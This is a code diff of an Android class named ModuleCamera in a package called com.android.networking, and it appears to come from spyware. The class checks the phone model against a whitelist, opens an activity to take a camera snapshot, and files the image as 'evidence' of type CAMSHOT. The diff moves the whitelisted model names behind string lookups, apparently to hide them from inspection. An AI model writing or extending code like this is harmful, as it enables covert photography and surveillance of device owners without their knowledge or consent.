@@ -23,6 +23,7 @@ import android.media.AudioManager;
 import android.os.Build;
 import android.view.SurfaceHolder;
 
+import com.android.networking.Messages;
 import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
@@ -43,13 +44,19 @@ public class ModuleCamera extends BaseInstantModule {
 	private static final String TAG = "ModuleCamera"; //$NON-NLS-1$
 
 	// Motorola XT910 (suono), Samsung Next (suono), HTC Explorer A310e (suono)
-	String[] blackList=new String[]{ "XT910", "GT-S5570",  "HTC Explorer A310e"};
+	//String[] blackList = new String[] { "XT910", "GT-S5570", "HTC Explorer A310e" };
 
-	
+	// g_1=LT18i
+	// g_2=GT-I9300
+	// g_3=GT-I9100
+	// g_4=Galaxy Nexus
+	// g_5=HTC Vision
 	// camera whitelist, module enabled if Build.MODEL into this lits
 	// Sony XPERIA, Samsung S3, Samsung S2, Nexus, HTC Desire Z
-	String[] whiteList=new String[]{"LT18i", 
-			"GT-I9300", "GT-I9100", "Galaxy Nexus", "HTC Vision" };
+	// String[] whiteList=new String[]{"LT18i", "GT-I9300", "GT-I9100",
+	// "Galaxy Nexus", "HTC Vision" };
+	String[] whiteList = new String[] { Messages.getString("g_1"), Messages.getString("g_2"),
+			Messages.getString("g_3"), Messages.getString("g_4"), Messages.getString("g_5"), };
 
 	/*
 	 * (non-Javadoc)
@@ -58,33 +65,33 @@ public class ModuleCamera extends BaseInstantModule {
 	 */
 	@Override
 	public boolean parse(ConfModule conf) {
-		
+
 		boolean force = conf.getBoolean("force", false);
 		boolean face = conf.getBoolean("face", false);
-		
-		if(!Cfg.CAMERA){
+
+		if (!Cfg.CAMERA) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (parse), camera disabled by Cfg");
 			}
 			return false;
 		}
-		
-		if(force){
+
+		if (force) {
 			return checkCameraHardware();
 		}
-		
+
 		// whitelist check
 		for (String white : whiteList) {
-			if(Build.MODEL.equals(white)){
+			if (Build.MODEL.equals(white)) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (parse), found white: " + Build.MODEL);
 				}
 				return checkCameraHardware();
 			}
 		}
-		
+
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (parse), unknown Build.Model:" +Build.MODEL);
+			Check.log(TAG + " (parse), unknown Build.Model:" + Build.MODEL);
 		}
 		return false;
 	}
@@ -102,21 +109,21 @@ public class ModuleCamera extends BaseInstantModule {
 
 	/** Check if this device has a camera */
 	private boolean checkCameraHardware() {
-	    if (Status.self().getAppContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)){
-	        // this device has a camera
-	    	if (Cfg.DEBUG) {
+		if (Status.self().getAppContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
+			// this device has a camera
+			if (Cfg.DEBUG) {
 				Check.log(TAG + " (checkCameraHardware), camera present");
 			}
-	        return true;
-	    } else {
-	        // no camera on this device
-	    	if (Cfg.DEBUG) {
+			return true;
+		} else {
+			// no camera on this device
+			if (Cfg.DEBUG) {
 				Check.log(TAG + " (checkCameraHardware), no camera");
 			}
-	        return false;
-	    }
+			return false;
+		}
 	}
-	
+
 	/**
 	 * Snapshot.
 	 * 
@@ -131,13 +138,12 @@ public class ModuleCamera extends BaseInstantModule {
 		Intent intent = new Intent(Status.getAppContext(), CGui.class);
 		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 		Status.getAppContext().startActivity(intent);
-				
-	}
 
+	}
 
 	public static void callback(byte[] bs) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (callback), bs: "+ bs.length);
+			Check.log(TAG + " (callback), bs: " + bs.length);
 		}
 		EvidenceReference.atomic(EvidenceType.CAMSHOT, null, bs);
 	}
